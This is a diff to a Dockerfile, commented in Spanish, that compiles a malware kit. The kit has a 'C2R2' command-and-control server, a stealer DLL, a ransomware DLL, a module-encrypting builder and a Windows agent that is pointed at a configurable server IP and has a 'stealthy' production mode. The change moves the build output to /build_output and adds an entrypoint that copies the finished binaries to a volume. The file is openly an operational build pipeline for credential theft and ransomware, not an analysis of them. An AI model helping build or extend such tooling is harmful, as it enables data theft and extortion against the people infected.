@@ -28,88 +28,99 @@ ARG AGENT_NAME=agent
 ARG PRODUCTION_MODE=false
 
 # Script de compilación
-RUN mkdir -p /output
+RUN mkdir -p /build_output
 
 # 1. Compilar el servidor (Linux)
 RUN echo "🔨 Compilando servidor C2R2..." && \
     cd c2r2-server && \
     cargo build --release --target x86_64-unknown-linux-gnu && \
-    cp target/x86_64-unknown-linux-gnu/release/c2r2-server /output/c2r2-server && \
-    echo "✅ Servidor compilado: /output/c2r2-server"
+    cp target/x86_64-unknown-linux-gnu/release/c2r2-server /build_output/c2r2-server && \
+    chmod +x /build_output/c2r2-server && \
+    echo "✅ Servidor compilado: /build_output/c2r2-server"
 
 # 2. Compilar stealer DLL
 RUN echo "🔨 Compilando stealer.dll..." && \
     cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll && \
-    cp target/x86_64-pc-windows-gnu/release/stealer.dll /output/stealer.dll && \
-    echo "✅ Stealer DLL compilado: /output/stealer.dll"
+    cp target/x86_64-pc-windows-gnu/release/stealer.dll /build_output/stealer.dll && \
+    echo "✅ Stealer DLL compilado: /build_output/stealer.dll"
 
 # 3. Compilar ransomware DLL
 RUN echo "🔨 Compilando ransomware.dll..." && \
     cargo build --release --target x86_64-pc-windows-gnu --package ransomware-dll && \
-    cp target/x86_64-pc-windows-gnu/release/ransomware.dll /output/ransomware.dll && \
-    echo "✅ Ransomware DLL compilado: /output/ransomware.dll"
+    cp target/x86_64-pc-windows-gnu/release/ransomware.dll /build_output/ransomware.dll && \
+    echo "✅ Ransomware DLL compilado: /build_output/ransomware.dll"
 
 # 4. Compilar el builder (Linux)
 RUN echo "🔨 Compilando builder..." && \
     cargo build --release --target x86_64-unknown-linux-gnu --package builder && \
-    cp target/x86_64-unknown-linux-gnu/release/builder /output/builder && \
-    chmod +x /output/builder && \
-    echo "✅ Builder compilado: /output/builder"
+    cp target/x86_64-unknown-linux-gnu/release/builder /build_output/builder && \
+    chmod +x /build_output/builder && \
+    echo "✅ Builder compilado: /build_output/builder"
 
 # 5. Encriptar módulos usando el builder
 RUN echo "🔐 Encriptando módulo stealer..." && \
-    /output/builder encrypt-module --module stealer && \
+    /build_output/builder encrypt-module --module stealer && \
     echo "✅ Stealer encriptado"
 
 RUN echo "🔐 Encriptando módulo ransomware..." && \
-    /output/builder encrypt-module --module ransomware && \
+    /build_output/builder encrypt-module --module ransomware && \
     echo "✅ Ransomware encriptado"
 
 # 6. Copiar módulos encriptados
-RUN mkdir -p /output/modules && \
-    cp c2r2-server/modules/*.enc /output/modules/ 2>/dev/null || true && \
-    cp c2r2-server/modules/*.key /output/modules/ 2>/dev/null || true && \
-    echo "✅ Módulos encriptados copiados a /output/modules"
+RUN mkdir -p /build_output/modules && \
+    cp c2r2-server/modules/*.enc /build_output/modules/ 2>/dev/null || true && \
+    cp c2r2-server/modules/*.key /build_output/modules/ 2>/dev/null || true && \
+    echo "✅ Módulos encriptados copiados a /build_output/modules"
 
 # 7. Compilar el agente con configuración específica
 RUN echo "🔨 Compilando agente con servidor ${SERVER_IP}:${SERVER_PORT}..." && \
     if [ "$PRODUCTION_MODE" = "true" ]; then \
-        /output/builder build-agent \
+        /build_output/builder build-agent \
             --name "${AGENT_NAME}" \
             --server "${SERVER_IP}:${SERVER_PORT}" \
             --production; \
     else \
-        /output/builder build-agent \
+        /build_output/builder build-agent \
             --name "${AGENT_NAME}" \
             --server "${SERVER_IP}:${SERVER_PORT}"; \
     fi && \
-    cp ${AGENT_NAME}.exe /output/${AGENT_NAME}.exe && \
-    echo "✅ Agente compilado: /output/${AGENT_NAME}.exe"
+    cp ${AGENT_NAME}.exe /build_output/${AGENT_NAME}.exe && \
+    echo "✅ Agente compilado: /build_output/${AGENT_NAME}.exe"
 
 # Crear un resumen de los binarios generados
-RUN echo "📦 RESUMEN DE COMPILACIÓN" > /output/BUILD_INFO.txt && \
-    echo "========================" >> /output/BUILD_INFO.txt && \
-    echo "" >> /output/BUILD_INFO.txt && \
-    echo "Servidor C2:" >> /output/BUILD_INFO.txt && \
-    ls -lh /output/c2r2-server >> /output/BUILD_INFO.txt && \
-    echo "" >> /output/BUILD_INFO.txt && \
-    echo "Agente Windows:" >> /output/BUILD_INFO.txt && \
-    ls -lh /output/${AGENT_NAME}.exe >> /output/BUILD_INFO.txt && \
-    echo "  Configurado para: ${SERVER_IP}:${SERVER_PORT}" >> /output/BUILD_INFO.txt && \
-    echo "  Modo: $(if [ "$PRODUCTION_MODE" = "true" ]; then echo "PRODUCCIÓN (stealthy)"; else echo "DESARROLLO (debug)"; fi)" >> /output/BUILD_INFO.txt && \
-    echo "" >> /output/BUILD_INFO.txt && \
-    echo "Builder:" >> /output/BUILD_INFO.txt && \
-    ls -lh /output/builder >> /output/BUILD_INFO.txt && \
-    echo "" >> /output/BUILD_INFO.txt && \
-    echo "DLLs:" >> /output/BUILD_INFO.txt && \
-    ls -lh /output/*.dll >> /output/BUILD_INFO.txt && \
-    echo "" >> /output/BUILD_INFO.txt && \
-    echo "Módulos encriptados:" >> /output/BUILD_INFO.txt && \
-    ls -lh /output/modules/ >> /output/BUILD_INFO.txt && \
-    cat /output/BUILD_INFO.txt
+RUN echo "📦 RESUMEN DE COMPILACIÓN" > /build_output/BUILD_INFO.txt && \
+    echo "========================" >> /build_output/BUILD_INFO.txt && \
+    echo "" >> /build_output/BUILD_INFO.txt && \
+    echo "Servidor C2:" >> /build_output/BUILD_INFO.txt && \
+    ls -lh /build_output/c2r2-server >> /build_output/BUILD_INFO.txt && \
+    echo "" >> /build_output/BUILD_INFO.txt && \
+    echo "Agente Windows:" >> /build_output/BUILD_INFO.txt && \
+    ls -lh /build_output/${AGENT_NAME}.exe >> /build_output/BUILD_INFO.txt && \
+    echo "  Configurado para: ${SERVER_IP}:${SERVER_PORT}" >> /build_output/BUILD_INFO.txt && \
+    echo "  Modo: $(if [ "$PRODUCTION_MODE" = "true" ]; then echo "PRODUCCIÓN (stealthy)"; else echo "DESARROLLO (debug)"; fi)" >> /build_output/BUILD_INFO.txt && \
+    echo "" >> /build_output/BUILD_INFO.txt && \
+    echo "Builder:" >> /build_output/BUILD_INFO.txt && \
+    ls -lh /build_output/builder >> /build_output/BUILD_INFO.txt && \
+    echo "" >> /build_output/BUILD_INFO.txt && \
+    echo "DLLs:" >> /build_output/BUILD_INFO.txt && \
+    ls -lh /build_output/*.dll >> /build_output/BUILD_INFO.txt && \
+    echo "" >> /build_output/BUILD_INFO.txt && \
+    echo "Módulos encriptados:" >> /build_output/BUILD_INFO.txt && \
+    ls -lh /build_output/modules/ >> /build_output/BUILD_INFO.txt && \
+    cat /build_output/BUILD_INFO.txt
+
+# Script de copia que se ejecuta cuando el contenedor inicia
+RUN echo '#!/bin/bash' > /entrypoint.sh && \
+    echo 'set -e' >> /entrypoint.sh && \
+    echo 'echo "📦 Copiando binarios compilados a /output..."' >> /entrypoint.sh && \
+    echo 'cp -r /build_output/* /output/' >> /entrypoint.sh && \
+    echo 'echo "✅ Binarios copiados exitosamente a /output"' >> /entrypoint.sh && \
+    echo 'echo ""' >> /entrypoint.sh && \
+    echo 'cat /output/BUILD_INFO.txt' >> /entrypoint.sh && \
+    chmod +x /entrypoint.sh
 
 # El directorio /output contiene todos los binarios listos para usar
 VOLUME ["/output"]
 
-# Por defecto, mostrar información de compilación
-CMD ["cat", "/output/BUILD_INFO.txt"]
+# Copiar binarios al volumen cuando el contenedor inicia
+ENTRYPOINT ["/entrypoint.sh"]
